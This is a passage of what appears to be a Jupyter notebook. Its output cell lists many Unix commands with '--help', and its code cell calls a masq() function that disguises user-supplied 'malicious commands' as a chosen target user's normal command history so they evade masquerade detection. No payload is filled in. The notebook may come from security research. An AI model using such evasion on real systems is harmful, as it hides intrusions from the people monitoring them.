            " rlogin --help\n",
            " rm --help\n",
            " rmail --help\n",
            " rmm --help\n",
            " rootless --help\n",
            " rpcinfo --help\n",
            " rsh --help\n",
            " rshd --help\n",
            " rtslave --help\n",
            " run_swin --help\n",
            " runnit --help\n",
            " rup --help\n",
            " rusers --help\n",
            " rvplayer --help\n",
            " rwho --help\n",
            " rz --help\n",
            " sam --help\n",
            " sample --help\n",
            " samterm --help\n",
            " sar --help\n",
            " scamp_fi --help\n",
            " scamp_pr --help\n",
            " scamp_to --help\n",
            " scampdet --help\n",
            " scan --help\n",
            " scatter_ --help\n",
            " sccs --help\n",
            " scheme --help\n",
            " sdec --help\n",
            " sed --help\n",
            " see_scam --help\n",
            " seecalls --help\n",
            " seediff --help\n",
            " sendmail --help\n",
            " seq --help\n",
            " setup --help\n",
            " sfplay --help\n",
            " sfstdgen --help\n",
            " sgihelp --help\n",
            " sh --help\n",
            " shelpMot --help\n",
            " show --help\n",
            " show_fil --help\n",
            " showcal --help\n",
            " showdoc --help\n",
            " showfile --help\n",
            " shownona --help\n",
            " showprod --help\n",
            " showps --help\n",
            " sim301bK --help\n",
            " sim301bS --help\n",
            " sleep --help\n",
            " slide --help\n",
            " sort --help\n",
            " spec --help\n",
            " spell --help\n",
            " split --help\n",
            " sprog --help\n",
            " sqp_fill --help\n",
            " ssh-add --help\n",
            " ssh-askp --help\n",
            " ssh-keyg --help\n",
            " ssplay --help\n",
            " states --help\n",
            " stream_b --help\n",
            " stream_t --help\n",
            " strings --help\n",
            " stripper --help\n",
            " stty --help\n",
            " style2 --help\n",
            " style3 --help\n",
            " su --help\n",
            " suepope4 --help\n",
            " sum --help\n",
            " summary. --help\n",
            " swap --help\n",
            " sysinfo --help\n",
            " t --help\n",
            " tail --help\n",
            " talk --help\n",
            " tar --help\n",
            " tbl --help\n",
            " tcm --help\n",
            " tcm5na --help\n",
            " tcm8 --help\n",
            " tcm8a --help\n",
            " tcm8na --help\n",
            " tcpostio --help\n",
            " tcppost --help\n",
            " tee --help\n",
            " tektroni --help\n",
            " tel --help\n",
            " telnet --help\n",
            " telno --help\n",
            " tes --help\n",
            " test --help\n",
            " test.m2. --help\n",
            " test.pl --help\n",
            " test2.pl --help\n",
            " testFont --help\n",
            " testHist --help\n",
            " tester --help\n",
            " text_are --help\n",
            " tftp --help\n",
            " tifftofa --help\n",
            " toolches --help\n",
            " top --help\n",
            " touch --help\n",
            " tput --help\n",
            " tr --help\n",
            " tracerou --help\n",
            " trn --help\n",
            " true --help\n",
            " tset --help\n",
            " ttcm --help\n",
            " ttcm8 --help\n",
            " tty --help\n",
            " twm --help\n",
            " twoprint --help\n",
            " ul --help\n",
            " uname --help\n",
            " uniq --help\n",
            " unpack --help\n",
            " unzip --help\n",
            " uopt --help\n",
            " update --help\n",
            " use_abus --help\n",
            " userenv --help\n",
            " uudecode --help\n",
            " uuencode --help\n",
            " uuname --help\n",
            " v10sort --help\n",
            " vacation --help\n",
            " vc --help\n",
            " vim --help\n",
            " vinay --help\n",
            " vipw --help\n",
            " virmf --help\n",
            " virtex --help\n",
            " volumes. --help\n",
            " vsimsg --help\n",
            " vsiupdst --help\n",
            " vt100 --help\n",
            " wait4wm --help\n",
            " wc --help\n",
            " wdefine --help\n",
            " webify --help\n",
            " webmagic --help\n",
            " where --help\n",
            " whereis --help\n",
            " which --help\n",
            " whoami --help\n",
            " whodo --help\n",
            " whois --help\n",
            " window_t --help\n",
            " windows --help\n",
            " x11perf --help\n",
            " x3270 --help\n",
            " xargs --help\n",
            " xbiff --help\n",
            " xcal --help\n",
            " xcalc --help\n",
            " xclock --help\n",
            " xconfirm --help\n",
            " xdemineu --help\n",
            " xdm --help\n",
            " xdpyinfo --help\n",
            " xdvi --help\n",
            " xemacs-1 --help\n",
            " xemacs-2 --help\n",
            " xev --help\n",
            " xfig --help\n",
            " xfontsel --help\n",
            " xfs --help\n",
            " xgas --help\n",
            " xgobi --help\n",
            " xhost --help\n",
            " xlbiff --help\n",
            " xlistscr --help\n",
            " xlsclien --help\n",
            " xlsfonts --help\n",
            " xmag --help\n",
            " xman --help\n",
            " xmaplev4 --help\n",
            " xmaplev5 --help\n",
            " xmessage --help\n",
            " xmh --help\n",
            " xmkmf --help\n",
            " xpaint --help\n",
            " xpdf --help\n",
            " xpr --help\n",
            " xprop --help\n",
            " xrdb --help\n",
            " xrn --help\n",
            " xrt_auth --help\n",
            " xrtld --help\n",
            " xset --help\n",
            " xsetroot --help\n",
            " xt --help\n",
            " xterm --help\n",
            " xupdate --help\n",
            " xv --help\n",
            " xwininfo --help\n",
            " xwsh --help\n",
            " xxx --help\n",
            " ypcat --help\n",
            " yppasswd --help\n",
            " z --help\n",
            " zip --help\n",
            " zsh --help\n",
            " zubs --help\n",
            " zz2 --help\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "metadata": {
        "id": "brLLve2g9vX5",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Run `masq()` on your own examples below:"
      ]
    },
    {
      "metadata": {
        "id": "2ulst1zuf78W",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Run masq( ) on your own examples:\n",
        "masq(\n",
        "    # Put your malicious commands here:\n",
        "    script=\"\"\"\n",
        "\n",
        "    \"\"\",\n",
        "    # Put your target user here (indexed from 0 to 49):\n",
        "    target_user=0, \n",
        "    # Aggressiveness: how large a deviation do we allow before we give up? (scaled from 0.0-1.0)\n",
        "    # Smaller numbers will result in a shorter script, but also give less flexibility. If the attack fails,\n",
        "    # it might work if you up the aggressiveness.\n",
        "    aggressiveness=0.5, \n",
        ")"
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}